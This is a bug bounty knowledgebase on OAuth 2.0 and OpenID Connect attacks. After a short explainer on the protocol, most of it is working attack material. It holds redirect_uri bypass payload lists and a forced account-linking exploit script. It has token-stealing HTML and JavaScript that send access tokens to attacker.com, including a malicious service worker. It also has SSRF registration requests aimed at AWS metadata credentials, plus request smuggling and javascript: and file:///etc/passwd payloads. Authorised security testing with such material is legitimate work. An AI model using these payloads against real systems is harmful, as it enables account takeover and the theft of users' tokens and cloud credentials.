# OAuth Advanced Bug Hunting Knowledgebase

> **Research-grade markdown knowledgebase for advanced bug bounty hunting and black-box testing of OAuth 2.0 / OpenID Connect implementations.**

> Compiled from PortSwigger Web Security Academy, HackTricks, PayloadsAllTheThings, ProjectDiscovery, and real-world research.

---

## Table of Contents

- [Basics](#basics)
- [OAuth Theory](#oauth-theory)
- [OpenID Connect Internals](#openid-connect-internals)
- [OAuth Grant Types](#oauth-grant-types)
- [redirect_uri Bypass Techniques](#redirect_uri-bypass-techniques)
- [Forced OAuth Profile Linking](#forced-oauth-profile-linking)
- [Token Theft Payloads](#token-theft-payloads)
- [Implicit Flow Attacks](#implicit-flow-attacks)
- [Authorization Code Interception](#authorization-code-interception)
- [Dynamic Client Registration SSRF](#dynamic-client-registration-ssrf)
- [postMessage + OAuth Chains](#postmessage--oauth-chains)
- [Cache Poisoning + OAuth Chains](#cache-poisoning--oauth-chains)
- [Request Smuggling + OAuth Chains](#request-smuggling--oauth-chains)
- [Open Redirect + OAuth Chains](#open-redirect--oauth-chains)
- [Service Worker + OAuth Chains](#service-worker--oauth-chains)
- [Parser Confusion Payloads](#parser-confusion-payloads)
- [Browser Quirks](#browser-quirks)
- [Gadget Chains](#gadget-chains)
- [Real World Case Studies](#real-world-case-studies)
- [Fuzzing Payloads](#fuzzing-payloads)
- [Automation Workflows](#automation-workflows)
- [Recon Methodology](#recon-methodology)
- [Nuclei Templates](#nuclei-templates)
- [Tools and Scanners](#tools-and-scanners)
- [Advanced Research](#advanced-research)
- [Bug Bounty Writeups](#bug-bounty-writeups)
- [Payload Collections](#payload-collections)
- [WAF Bypasses](#waf-bypasses)
- [Detection Techniques](#detection-techniques)
- [References](#references)

---

## Basics

### What is OAuth?

OAuth 2.0 is an authorization framework that enables websites and web applications to request limited access to a user's account on another application without exposing login credentials.

### Key Actors

| Actor | Description |
|-------|-------------|
| **Client Application** | The website/app that wants to access user data |
| **Resource Owner** | The user whose data is being accessed |
| **OAuth Service Provider** | The website controlling user data and access |
| **Authorization Server** | Issues access tokens after authenticating the user |
| **Resource Server** | Hosts protected resources; validates access tokens |

### Identifying OAuth Authentication

The most reliable way to identify OAuth is to proxy traffic through Burp and look for the first request to `/authorization` containing:

```http
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: oauth-authorization-server.com
```

Key parameters to watch for:
- `client_id` - Unique client identifier
- `redirect_uri` - Callback endpoint (primary attack surface)
- `response_type` - `code` (authorization code) or `token` (implicit)
- `scope` - Requested permissions
- `state` - CSRF protection token

### Standard Discovery Endpoints

Always probe these endpoints during recon:

```
GET /.well-known/oauth-authorization-server
GET /.well-known/openid-configuration
```

These return JSON configuration files revealing:
- Supported grant types
- Registration endpoints
- JWKS URIs
- Supported scopes
- Response modes
- Additional features (dynamic registration, request_uri support, etc.)

---

## OAuth Theory

### Why OAuth is Vulnerable

1. **Specification is vague and flexible** - Most implementation details are optional
2. **Lack of built-in security features** - Security relies entirely on developer configuration
3. **Sensitive data sent via browser** - Codes/tokens exposed in URLs, fragments, headers
4. **Complex multi-party flow** - Many moving parts = many opportunities for misconfiguration
5. **Backwards compatibility pressure** - Legacy flows (implicit) still widely supported

### OAuth Authentication Flow (SSO-like)

1. User chooses 'Log in with social media'
2. Client requests access to identifying data (email, profile)
3. After receiving access token, client fetches data from `/userinfo`
4. Client uses this data as username to log the user in
5. Access token often used in place of traditional password

### Security Boundaries

```
BROWSER (User-Agent)
  Client App (Frontend)  <->  OAuth Server (AuthZ + RS)
         |
         | POST /authenticate
         v
  Client App (Backend)
```

**Critical insight**: In implicit flow, the POST to `/authenticate` is exposed to attackers. If the server does not verify the token matches the claimed identity, impersonation is trivial.

---

## OpenID Connect Internals

### OpenID Connect vs OAuth 2.0

| Feature | OAuth 2.0 | OpenID Connect |
|---------|-----------|----------------|
| Purpose | Authorization | Authentication |
| Token | Access Token | ID Token + Access Token |
| Identity | No user identity | Verifies user identity |
| Discovery | Not standardized | `/.well-known/openid-configuration` |
| Session | Not managed | Session Management spec |

### ID Token Structure (JWT)

```json
{
  "alg": "RS256",
  "typ": "JWT"
}
.
{
  "iss": "https://oauth-server.com",
  "sub": "user123",
  "aud": "client_id",
  "exp": 1234567890,
  "iat": 1234567800,
  "nonce": "random_value",
  "email": "user@example.com",
  "email_verified": true
}
```

### Key OIDC Endpoints

```
/.well-known/openid-configuration    # Discovery
/authorize                           # Authentication request
/token                               # Token exchange
/userinfo                            # User info endpoint
/logout                              # RP-initiated logout
/register                            # Dynamic client registration
```

### OpenID Connect Discovery Response

```json
{
  "issuer": "https://oauth-server.com",
  "authorization_endpoint": "https://oauth-server.com/auth",
  "token_endpoint": "https://oauth-server.com/token",
  "userinfo_endpoint": "https://oauth-server.com/userinfo",
  "jwks_uri": "https://oauth-server.com/jwks",
  "registration_endpoint": "https://oauth-server.com/reg",
  "scopes_supported": ["openid", "profile", "email"],
  "response_types_supported": ["code", "id_token", "token"],
  "grant_types_supported": ["authorization_code", "implicit"],
  "token_endpoint_auth_methods_supported": ["client_secret_basic"],
  "request_uri_parameter_supported": true,
  "require_request_uri_registration": false
}
```

**Attack surface from discovery**: `registration_endpoint` enables dynamic client registration attacks. `request_uri_parameter_supported` enables request_uri SSRF.

---

## OAuth Grant Types

### Authorization Code Flow

```
1. Client --> Auth Server: GET /authorize?response_type=code&...
2. User logs in & consents
3. Auth Server --> Client: redirect to /callback?code=AUTH_CODE&state=...
4. Client --> Auth Server: POST /token (code + client_secret)
5. Auth Server --> Client: access_token + refresh_token
6. Client --> Resource Server: GET /userinfo (Bearer token)
```

**Security**: Most secure grant type. Sensitive data travels via back-channel.

### Authorization Code Flow with PKCE

```
1. Client generates: code_verifier (random string)
2. Client computes: code_challenge = BASE64URL(SHA256(code_verifier))
3. Client --> Auth Server: GET /authorize?code_challenge=...&code_challenge_method=S256
4. Auth Server --> Client: redirect with code
5. Client --> Auth Server: POST /token (code + code_verifier)
6. Auth Server verifies: SHA256(code_verifier) == code_challenge
```

**Critical**: PKCE is now mandatory for all public clients per RFC 9700. Without PKCE, authorization codes intercepted by malicious apps can be exchanged for tokens.

### Implicit Flow (DEPRECATED)

```
1. Client --> Auth Server: GET /authorize?response_type=token
2. User logs in & consents
3. Auth Server --> Client: redirect to /callback#access_token=TOKEN
```

**Why it is dangerous**:
- Token exposed in URL fragment
- Fragment visible in browser history
- Fragment sent in Referer header to external resources
- Token accessible to any JavaScript on the page
- No client authentication possible

**RFC 9700**: 'Clients SHOULD NOT use the implicit grant.' Modern apps should use Authorization Code Flow with PKCE.

### Client Credentials Flow

```
Client --> Auth Server: POST /token (grant_type=client_credentials)
Auth Server --> Client: access_token
```

**Use case**: Server-to-server authentication. No user involvement.

### Device Code Flow

```
1. Client --> Auth Server: POST /device_authorization
2. Auth Server --> Client: device_code + user_code + verification_uri
3. User visits verification_uri, enters user_code
4. Client polls POST /token with device_code
```

**Attack surface**: Polling endpoint may be vulnerable to enumeration.

### Resource Owner Password Credentials (ROPC) - DEPRECATED

```
Client --> Auth Server: POST /token (grant_type=password&username=...&password=...)
```

**Why it is dangerous**: Application receives user credentials directly. Bypasses OAuth's core value proposition.

---

## redirect_uri Bypass Techniques

### Overview

The `redirect_uri` parameter is the single most attacked OAuth parameter. It determines where authorization codes and access tokens are sent. If an attacker can control this URI, they can steal credentials.

### Bypass Technique 1: Exact Match Bypass via Path Traversal

When the server validates `redirect_uri` using `startsWith()` instead of exact matching:

```
Whitelisted: https://client-app.com/oauth/callback
Bypass:      https://client-app.com/oauth/callback/../../profile
Resolves to: https://client-app.com/profile
```

**Payloads**:
```
redirect_uri=https://client-app.com/oauth/callback/../admin
redirect_uri=https://client-app.com/oauth/callback/../../api/users
redirect_uri=https://client-app.com/oauth/callback/%2e%2e%2fprofile
redirect_uri=https://client-app.com/oauth/callback/%252e%252e%2fprofile
redirect_uri=https://client-app.com/oauth/callback/..%2f..%2fadmin
```

### Bypass Technique 2: Subdomain Takeover / Wildcard Abuse

```
Whitelisted: https://*.client-app.com
Bypass:      https://attacker.client-app.com
```

**Test for wildcard patterns**:
```
redirect_uri=https://evil.client-app.com
redirect_uri=https://client-app.com.evil.com
redirect_uri=https://evilcom/client-app.com
```

### Bypass Technique 3: URL Parser Confusion

Different URL parsers (browser, server, validation library) may interpret the same URL differently:

```
https://client-app.com &@foo.evil-user.net#@bar.evil-user.net/
```

**Parser confusion payloads**:
```
redirect_uri=https://client-app.com@evil.com
redirect_uri=https://client-app.com.evil.com
redirect_uri=https://evil.com?client-app.com
redirect_uri=https://client-app.com?redirect_uri=https://evil.com
redirect_uri=https://client-app.com#https://evil.com
redirect_uri=https://client-app.com%5c@evil.com
redirect_uri=https://client-app.com%00.evil.com
redirect_uri=https://client-app.com%E3%80%82evil.com  # Unicode fullwidth period
```

### Bypass Technique 4: Parameter Pollution

Submit duplicate `redirect_uri` parameters to exploit parser differences:

```
GET /auth?client_id=123&redirect_uri=https://client-app.com/callback&redirect_uri=https://evil.com
```

Some parsers use the first, some use the last. Test both.

### Bypass Technique 5: Response Mode Manipulation

Changing `response_mode` can alter how `redirect_uri` is parsed:

```
response_mode=query      # Code in query string
response_mode=fragment   # Token in fragment
response_mode=form_post  # Code in POST body
response_mode=web_message  # postMessage delivery (often allows more subdomains)
```

**Test**: `response_mode=web_message` often has weaker redirect_uri validation.

### Bypass Technique 6: localhost Abuse

```
redirect_uri=http://localhost:8080/callback
redirect_uri=http://localhost.evil.com/callback
redirect_uri=http://127.0.0.1:8080/callback
```

Many OAuth providers allow localhost redirects for development. Attackers can register `localhost.evil.com` or use DNS rebinding.

### Bypass Technique 7: Scheme Abuse

```
redirect_uri=javascript:alert(1)
redirect_uri=data:text/html,<script>alert(1)</script>
redirect_uri=file:///etc/passwd
```

### Bypass Technique 8: Fragment Injection

For implicit flow, the token is appended as a fragment. If you can inject your own fragment, you may confuse the parser:

```
redirect_uri=https://client-app.com/callback#evil_fragment
```

Result: `https://client-app.com/callback#evil_fragment&access_token=REAL_TOKEN`

### Bypass Technique 9: Unicode / IDN Homograph

```
redirect_uri=https://client-аpp.com/callback  # Cyrillic 'a' (U+0430)
redirect_uri=https://client-app.com.xn--e1afmkfd.com
```

### Bypass Technique 10: HTTP Header Injection in redirect_uri

```
redirect_uri=https://client-app.com/callback%0d%0aLocation:%20https://evil.com
```

### Complete redirect_uri Bypass Payload List

```
# Path Traversal
https://victim.com/callback/../admin
https://victim.com/callback/../../etc/passwd
https://victim.com/callback/%2e%2e%2fprofile
https://victim.com/callback/%252e%252e%2fprofile
https://victim.com/callback/..%00/..%00/admin

# Subdomain/Domain Abuse
https://evil.victim.com
https://victim.com.evil.com
https://evil.com/victim.com
https://evil.com?redirect_uri=https://victim.com

# URL Parser Confusion
https://victim.com@evil.com
https://victim.com%5c@evil.com
https://victim.com%00@evil.com
https://victim.com%E3%80%82evil.com
https://victim.com.evil.com
https://victim.com?evil.com
https://victim.com#evil.com

# Parameter Pollution
redirect_uri=https://victim.com&redirect_uri=https://evil.com

# Scheme Abuse
javascript:alert(document.domain)
data:text/html,<script>alert(1)</script>
file:///etc/passwd

# localhost Abuse
http://localhost/callback
http://127.0.0.1:8080/callback
http://localhost.evil.com/callback

# Unicode/IDN
https://victim-аpp.com  # Cyrillic a
https://victim.com.xn--e1afmkfd.com

# Response Mode Bypass
response_mode=web_message&redirect_uri=https://evil.com
```

---

## Forced OAuth Profile Linking

### Overview

When a web application allows users to link their social media accounts for OAuth login, a missing or improperly validated `state` parameter can allow an attacker to force-link their social profile to a victim's account.

### Attack Flow

```
1. Attacker logs in with their own account
2. Attacker initiates OAuth linking flow
3. Attacker captures the authorization code/linking URL
4. Attacker drops their own request (code remains unused)
5. Attacker crafts CSRF payload with the captured code
6. Victim (admin) opens the malicious page
7. Victim's account gets linked to attacker's social profile
8. Attacker logs in as victim using their social media credentials
```

### Exploitation Steps

**Step 1**: Login to your account and initiate 'Attach social profile'

**Step 2**: Intercept the callback request:
```http
GET /oauth-linking?code=STOLEN_CODE HTTP/1.1
Host: victim-app.com
```

**Step 3**: Drop this request so the code is not consumed

**Step 4**: Craft exploit payload:
```html
<iframe src="https://victim-app.com/oauth-linking?code=STOLEN_CODE"></iframe>
```

**Step 5**: Deliver to victim. When victim's browser loads the iframe, their account gets linked to attacker's social profile.

**Step 6**: Attacker logs in as victim using 'Login with social media'

### Key Indicators

- No `state` parameter in OAuth linking flow
- Linking endpoint is GET-based (no CSRF token)
- Code can be reused or is single-use but attacker controls timing
- Admin has active session when exploit is delivered

### Automation Script (Python)

```python
#!/usr/bin/env python3
# Forced OAuth Profile Linking Exploit

import requests
import sys

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit(host, code):
    # Craft malicious page
    exploit_html = f'''
<html>
    <body>
        <iframe src="{host}/oauth-linking?code={code}" style="display:none;"></iframe>
    </body>
</html>'''

    # Deliver to victim (via exploit server, email, etc.)
    print(f"[+] Exploit crafted. Deliver to victim:")
    print(exploit_html)

if __name__ == "__main__":
    host = sys.argv[1]
    code = sys.argv[2]
    exploit(host, code)
```

---

## Token Theft Payloads

### Overview

Tokens can be stolen through multiple vectors: redirect_uri manipulation, open redirects, XSS, postMessage, Referer leakage, browser history, and more.

### Token Theft via redirect_uri

```html
<!-- Basic token theft via malicious redirect_uri -->
<iframe src="https://oauth-server.com/auth?client_id=CLIENT_ID&redirect_uri=https://attacker.com/steal&response_type=token&scope=openid%20profile%20email"></iframe>
```

### Token Theft via Open Redirect Chain

```
Step 1: Find directory traversal in redirect_uri
redirect_uri=https://victim.com/callback/../post/next?path=https://attacker.com

Step 2: Open redirect at /post/next forwards to attacker.com
Step 3: Token in fragment is preserved across redirect
Step 4: Attacker's JavaScript extracts token from fragment
```

**Complete exploit**:
```html
<script>
if (!document.location.hash) {
    // Stage 1: Redirect victim to OAuth with malicious redirect_uri
    window.location = 'https://oauth-server.com/auth?client_id=ID&redirect_uri=https://victim.com/callback/../post/next?path=https://attacker.com/exploit/&response_type=token&scope=openid%20profile%20email';
} else {
    // Stage 2: Extract token from fragment and exfiltrate
    window.location = '/?'+document.location.hash.substr(1);
}
</script>
```

### Token Theft via Referer Header

When OAuth callback contains token in URL, subsequent resource loads leak it via Referer:

```html
<!-- On attacker-controlled page referenced from callback -->
<img src="https://attacker.com/log">
```

Browser sends:
```http
GET /log HTTP/1.1
Host: attacker.com
Referer: https://victim.com/callback?code=SECRET_CODE
```

### Token Theft via Browser History

```javascript
// Access browser history entries (if same-origin)
history.pushState({}, '', '/callback#access_token=TOKEN');
// Token now in browser history, accessible via history API
```

### Token Theft via XSS on Callback Page

```javascript
// If callback page has XSS, steal token from URL
var token = new URLSearchParams(window.location.search).get('code');
fetch('https://attacker.com/steal?token=' + token);
```

### Token Theft via postMessage

See [postMessage + OAuth Chains](#postmessage--oauth-chains) section.

### Token Theft via HTML Injection + Meta Refresh

```html
<!-- If callback page reflects HTML without proper sanitization -->
<meta http-equiv="refresh" content="0;url=https://attacker.com/?token=CODE">
```

### Token Theft via Service Worker Interception

See [Service Worker + OAuth Chains](#service-worker--oauth-chains) section.

---

## Implicit Flow Attacks

### Authentication Bypass via Implicit Flow

**Vulnerability**: Client application receives user info + access token from OAuth server, then POSTs to `/authenticate` to create session. Server does not verify token belongs to claimed user.

**Attack**:
```http
POST /authenticate HTTP/1.1
Host: victim-app.com
Content-Type: application/json

{
    "email": "victim@example.com",
    "username": "victim",
    "token": "ATTACKER_VALID_TOKEN"
}
```

The server validates the token (it is real) but does not check if token belongs to `victim@example.com`. Attacker is logged in as victim.

**Python automation**:
```python
import requests

def bypass_auth(host, victim_email, attacker_token):
    data = {
        "email": victim_email,
        "username": victim_email.split('@')[0],
        "token": attacker_token
    }
    r = requests.post(f"{host}/authenticate", json=data, verify=False)
    return r.status_code == 200
```

### Scope Upgrade in Implicit Flow

1. Attacker steals access token with scope `openid email`
2. Attacker calls `/userinfo?scope=openid%20email%20profile`
3. If server does not validate scope against token issuance, extra data is returned

```http
GET /userinfo?scope=openid%20email%20profile HTTP/1.1
Host: oauth-server.com
Authorization: Bearer STOLEN_TOKEN
```

### Token Replay

Bearer tokens work from any location. Once stolen, attacker can replay from anywhere:

```bash
curl -H "Authorization: Bearer STOLEN_TOKEN" https://api.victim.com/userinfo
```

---

## Authorization Code Interception

### Custom URI Scheme Interception (Mobile)

On mobile devices, malicious apps can register as handlers for custom URI schemes:

```
Legitimate app registers: myapp://callback
Malicious app also registers: myapp://callback
```

When OAuth server redirects to `myapp://callback?code=CODE`, OS may present chooser or send to malicious app.

**Test for vulnerable schemes**:
```
myapp://callback
customscheme://auth
com.company.app://oauth
```

### Authorization Code Injection

Without PKCE, attacker who intercepts code can exchange it for tokens:

```http
POST /token HTTP/1.1
Host: oauth-server.com

client_id=CLIENT_ID&client_secret=SECRET&grant_type=authorization_code&code=INTERCEPTED_CODE&redirect_uri=https://legitimate.com/callback
```

**Mitigation**: PKCE code_verifier proves the same client requested and exchanged the code.

### Mix-up Attacks

When a client interacts with multiple authorization servers, attacker can trick client into sending authorization request to wrong server:

```
1. Attacker discovers client uses OAuth Server A and OAuth Server B
2. Attacker tricks client into sending request to Server B with Server A's client_id
3. User authenticates on Server B
4. Client receives code from Server B, tries to exchange with Server A
5. Depending on implementation, various attacks possible
```

**Mitigation**: Validate `iss` (issuer) claim in ID tokens. Use distinct redirect URIs per authorization server.

---

## Dynamic Client Registration SSRF

### Overview

OpenID Connect Dynamic Client Registration allows clients to register themselves. Multiple URI parameters in registration requests can trigger SSRF when the OAuth server fetches them.

### Vulnerable Registration Parameters

| Parameter | SSRF Trigger | Notes |
|-----------|-------------|-------|
| `logo_uri` | Server fetches logo for display | Most common vector |
| `jwks_uri` | Server fetches keys for JWT validation | Blind SSRF |
| `sector_identifier_uri` | Server fetches redirect URI list | May fetch immediately |
| `request_uris` | Server fetches request JWTs | Authorization-time fetch |
| `client_uri` | May be fetched for display | Less common |
| `policy_uri` | May be fetched for display | Less common |
| `tos_uri` | May be fetched for display | Less common |

### SSRF via logo_uri

**Step 1**: Register client with malicious logo_uri:
```http
POST /reg HTTP/1.1
Host: oauth-server.com
Content-Type: application/json

{
    "redirect_uris": ["https://attacker.com"],
    "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}
```

**Step 2**: Note the `client_id` from response

**Step 3**: Trigger logo fetch:
```http
GET /client/CLIENT_ID/logo HTTP/1.1
Host: oauth-server.com
```

**Result**: Server fetches AWS metadata, exposing credentials.

### SSRF via jwks_uri (Blind)

**Step 1**: Register with malicious jwks_uri:
```http
POST /reg HTTP/1.1
Host: oauth-server.com
Content-Type: application/json

{
    "redirect_uris": ["https://attacker.com"],
    "jwks_uri": "http://169.254.169.254/latest/meta-data/",
    "token_endpoint_auth_method": "private_key_jwt"
}
```

**Step 2**: Obtain authorization code for any user

**Step 3**: Exchange code with client_assertion:
```http
POST /token HTTP/1.1
Host: oauth-server.com
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=CODE&client_id=CLIENT_ID&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=JWT_TOKEN
```

**Result**: Server fetches jwks_uri to validate JWT, triggering SSRF.

### SSRF via request_uri (Authorization Endpoint)

Even without dynamic registration, if `request_uri` is supported:

```http
GET /authorize?response_type=code%20id_token&client_id=CLIENT_ID&request_uri=https://attacker.com/malicious.jwt HTTP/1.1
Host: oauth-server.com
```

**Note**: Many servers whitelist request_uris. If `require_request_uri_registration` is false, this may work directly.

### SSRF via sector_identifier_uri

```http
POST /reg HTTP/1.1
Host: oauth-server.com
Content-Type: application/json

{
    "redirect_uris": ["https://attacker.com"],
    "sector_identifier_uri": "http://169.254.169.254/latest/meta-data/"
}
```

Server may fetch this immediately or during authorization flow.

---

## postMessage + OAuth Chains

### Overview

When OAuth callbacks or related pages use `postMessage()` without origin validation, tokens can be leaked to attacker-controlled windows.

### Attack Pattern

```
1. Attacker finds callback page or related page with insecure postMessage
2. Attacker embeds OAuth authorization in iframe with redirect_uri pointing to that page
3. OAuth redirects to the page with token in fragment
4. Page's JavaScript sends token via postMessage to parent (attacker's page)
5. Attacker receives token
```

### Example: Insecure postMessage Listener

**Vulnerable callback page**:
```javascript
window.addEventListener('message', function(e) {
    // No origin validation!
    if (e.data.type === 'getToken') {
        e.source.postMessage({
            type: 'token',
            token: location.hash.substr(1)
        }, '*');
    }
});
```

**Attacker exploit**:
```html
<iframe id="oauth" src="https://oauth-server.com/auth?...&redirect_uri=https://victim.com/callback"></iframe>
<script>
window.addEventListener('message', function(e) {
    if (e.data.type === 'token') {
        fetch('/steal?' + e.data.token);
    }
});
// Trigger token extraction
setTimeout(() => {
    document.getElementById('oauth').contentWindow.postMessage(
        {type: 'getToken'}, '*'
    );
}, 3000);
</script>
```

### Real-World Chain: redirect_uri Traversal + postMessage

```
1. redirect_uri allows path traversal: /callback/../post/comment-form
2. /post/comment-form contains iframe that posts its URL to parent
3. Attacker embeds OAuth flow in iframe targeting /post/comment-form
4. OAuth redirects to /post/comment-form#access_token=TOKEN
5. comment-form posts its URL (including fragment with token) to parent
6. Attacker's page receives token via message event
```

**Exploit**:
```html
<iframe src="https://oauth-server.com/auth?client_id=ID&redirect_uri=https://victim.com/callback/../post/comment-form&response_type=token&scope=openid%20profile%20email" style="display:none;"></iframe>
<script>
window.addEventListener('message', function(e) {
    fetch("/" + encodeURIComponent(e.data.data));
}, false);
</script>
```

### postMessage Origin Bypass Techniques

```javascript
// Weak origin checks to bypass
e.origin.includes('victim.com')  // Bypass: attacker.victim.com
e.origin.endsWith('victim.com')  // Bypass: evilvictim.com
e.origin.match(/victim\.com/)    // Bypass: victim.com.evil.com

// Regex bypasses
/^https:\/\/.*victim\.com$/   // Bypass: https://evil.com/?victim.com
```

### Tools for postMessage Analysis

- **postMessage-tracker** (Chrome Extension) - Tracks postMessage listeners across all frames
- **DOM Invader** (Burp Suite) - Identifies postMessage vulnerabilities
- **pp-finder** - Finds prototype pollution and postMessage issues

---

## Cache Poisoning + OAuth Chains

### Overview

Web cache poisoning can turn reflected OAuth vulnerabilities into stored attacks affecting all users.

### Cache Poisoning via OAuth Callback

```
1. Attacker sends crafted request to OAuth callback with malicious parameters
2. Cache stores the poisoned response
3. All subsequent users hitting the same cache key receive the poisoned response
4. XSS or token theft executes for all users
```

### Cache Key Transformations to Exploit

Common exploitable transformations:
- Removing specific query parameters from cache key
- Removing entire query string
- Removing port from Host header
- URL-decoding before cache key calculation

**Example**: If cache ignores `state` parameter:
```
GET /callback?code=CODE&state=ATTACKER_PAYLOAD
```

Cache key: `/callback?code=CODE` (state removed)
Poisoned response served to all users with same code.

### OAuth + Cache Deception

```
1. Attacker tricks cache into storing private OAuth data
2. Attacker accesses cached data via different path
3. Private tokens leaked
```

**Example**:
```
GET /api/user?callback=/oauth/callback  # Cache sees this as API call
GET /oauth/callback                     # Returns cached user data
```

### Detection Methodology

1. **Select cache oracle**: Find endpoint that reflects URL or parameters
2. **Probe key handling**: Send two slightly different requests, check for cache hit
3. **Exploit via gadget chain**: Combine with XSS, open redirect, or OAuth token leakage

---

## Request Smuggling + OAuth Chains

### Overview

HTTP request smuggling can poison OAuth flows by injecting attacker-controlled requests into victim's connection.

### CL.TE Desync Attack

```http
POST /oauth/token HTTP/1.1
Host: victim.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED_REQUEST
```

Front-end uses Content-Length (13 bytes = `0\r\n\r\n`), back-end uses Transfer-Encoding. `SMUGGLED_REQUEST` becomes a new request.

### TE.CL Desync Attack

```http
POST /oauth/token HTTP/1.1
Host: victim.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

Front-end processes chunks, back-end reads 3 bytes. Remainder becomes new request.

### TE.TE Desync (Header Obfuscation)

```http
POST /oauth/token HTTP/1.1
Host: victim.com
Content-Length: 3
Transfer-Encoding: xchunked
Transfer-Encoding: chunked

8
SMUGGLED
0
```

One server ignores obfuscated header, other processes it.

### OAuth-Specific Smuggling Gadgets

**Session Poisoning via Smuggling**:
```
1. Attacker smuggles authorization request with attacker's redirect_uri
2. Victim's next request on same connection gets attacker's session
3. Victim approves OAuth flow, token sent to attacker's redirect_uri
```

**Token Endpoint Pollution**:
```
Smuggle: POST /token HTTP/1.1\r\nHost: attacker.com\r\n\r\n
Result: Token exchange request sent to attacker's server
```

### Browser-Powered Desync (Client-Side)

```javascript
fetch('https://victim.com/oauth/callback', {
    method: 'POST',
    body: 'SMUGGLED_REQUEST',
    credentials: 'include'
});
```

### Detection Tools

- **Burp HTTP Request Smuggler** - Automated desync detection
- **smuggler.py** - Command-line mass scanning
- **Burp Scanner** - Built-in desync detection

---

## Open Redirect + OAuth Chains

### Overview

Open redirects in the client application can be chained with redirect_uri traversal to leak tokens to external domains.

### Complete Attack Chain

```
Vulnerability 1: redirect_uri allows directory traversal
  redirect_uri=/callback/../post/next?path=ANYWHERE

Vulnerability 2: /post/next has open redirect
  /post/next?path=https://attacker.com --> 302 to attacker.com

Combined Attack:
  1. OAuth redirects to /post/next?path=https://attacker.com#token=XXX
  2. Open redirect triggers: Location: https://attacker.com#token=XXX
  3. Browser preserves fragment across redirect
  4. Attacker's JavaScript reads token from location.hash
```

### Exploit Script

```html
<script>
if (!document.location.hash) {
    // Stage 1: Initiate OAuth with malicious redirect_uri
    window.location = 'https://oauth-server.com/auth?client_id=ID&redirect_uri=https://victim.com/callback/../post/next?path=https://attacker.com/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email';
} else {
    // Stage 2: Extract token and exfiltrate
    window.location = '/?'+document.location.hash.substr(1);
}
</script>
```

### Open Redirect Detection Patterns

```
/redirect?url=https://evil.com
/redirect?next=https://evil.com
/redirect?return=https://evil.com
/redirect?path=https://evil.com
/goto?url=https://evil.com
/link?url=https://evil.com
/r/https://evil.com

# Protocol-relative
/redirect?url=//evil.com

# @ symbol bypass
/redirect?url=https://trusted.com@evil.com

# Whitelist bypass
/redirect?url=https://trusted.com.evil.com
```

### Fragment Preservation Behavior

| Browser | Preserves Fragment on Redirect? |
|---------|-------------------------------|
| Chrome | Yes (cross-origin) |
| Firefox | Yes |
| Safari | Yes |
| Edge | Yes |

**Critical**: URL fragments are preserved across 302 redirects. This is what makes open redirect + OAuth chains viable.

---

## Service Worker + OAuth Chains

### Overview

Service Workers can intercept OAuth requests/responses, cache tokens, or redirect OAuth flows maliciously.

### Token Theft via Service Worker

```javascript
// Malicious Service Worker installed on victim-app.com
self.addEventListener('fetch', event => {
    const url = new URL(event.request.url);

    // Intercept OAuth callback
    if (url.pathname === '/oauth/callback') {
        // Extract token from URL
        const token = url.hash.match(/access_token=([^&]+)/)?.[1];
        if (token) {
            // Exfiltrate token
            fetch('https://attacker.com/steal?token=' + token);
        }
    }

    event.respondWith(fetch(event.request));
});
```

### Service Worker Installation Prerequisites

1. Requires HTTPS (except localhost)
2. Must be on same-origin as registration scope
3. User must visit page that registers the SW

**Attack vector**: XSS --> Register malicious Service Worker --> Intercept all OAuth flows

### OAuth Flow Hijacking via Service Worker

```javascript
self.addEventListener('fetch', event => {
    const url = new URL(event.request.url);

    // Intercept authorization requests
    if (url.pathname === '/auth') {
        // Modify redirect_uri to attacker's domain
        url.searchParams.set('redirect_uri', 'https://attacker.com/steal');
        event.respondWith(fetch(url));
    }
});
```

### Real-World Example: GitLab Pages

GitLab Pages allowed token theft by intercepting `/auth` endpoint requests using Service Workers. The SW could intercept the OAuth flow and steal session tokens.

---

## Parser Confusion Payloads

### URL Parser Differential Parsing

Different components parse URLs differently. Exploit discrepancies between:
- Browser URL parser
- Server-side URL validation library
- HTTP client library
- Redirect handler

### Parser Confusion Payloads

```
# Authority confusion
https://user:pass@victim.com@evil.com
https://victim.com%5c@evil.com
https://victim.com%00@evil.com

# Path vs query confusion
https://victim.com/callback?foo=bar/../../evil

# Fragment confusion
https://victim.com/callback#@evil.com

# Encoding confusion
https://victim.com%2f@evil.com
https://victim.com%252f@evil.com

# Unicode confusion
https://victim.com%E3%80%82evil.com  # Fullwidth period
https://victim.com｡evil.com          # Halfwidth ideographic period

# Scheme confusion
https:victim.com@evil.com
//victim.com@evil.com
```

### Host Header Injection + OAuth

```http
GET /auth?client_id=123&redirect_uri=https://victim.com/callback HTTP/1.1
Host: victim.com
X-Forwarded-Host: evil.com
```

Some applications use `X-Forwarded-Host` to construct redirect URIs.

### JSON Parser Confusion in Registration

```json
{
    "redirect_uris": [
        "https://victim.com/callback",
        "https://evil.com"
    ],
    "logo_uri": "http://169.254.169.254/latest/meta-data/"
}
```

Some parsers may only validate the first redirect_uri but accept the second.

---

## Browser Quirks

### Fragment Handling

```javascript
// Fragments are never sent to server
// But are accessible to JavaScript
location.hash  // '#access_token=TOKEN'

// Fragments preserved across redirects
// 302 Location: https://evil.com preserves fragment
```

### Referer Policy

```http
Referrer-Policy: no-referrer        # Never send Referer
Referrer-Policy: origin             # Only send origin
Referrer-Policy: strict-origin-when-cross-origin  # Default in modern browsers
```

With `strict-origin-when-cross-origin`, cross-origin requests only send origin (not full URL). But same-origin requests send full URL including tokens.

### History API

```javascript
// Push state with token
history.pushState({}, '', '/callback#access_token=TOKEN');

// Token accessible via history
// Can be extracted by any same-origin script
```

### localStorage / sessionStorage

```javascript
// Tokens stored in localStorage are accessible to all same-origin scripts
localStorage.setItem('access_token', token);
// XSS on any same-origin page = token theft
```

**Mitigation**: Use `HttpOnly` cookies instead. JavaScript cannot access HttpOnly cookies.

### Cookie Behavior

```http
Set-Cookie: session=TOKEN; HttpOnly; Secure; SameSite=Strict
```

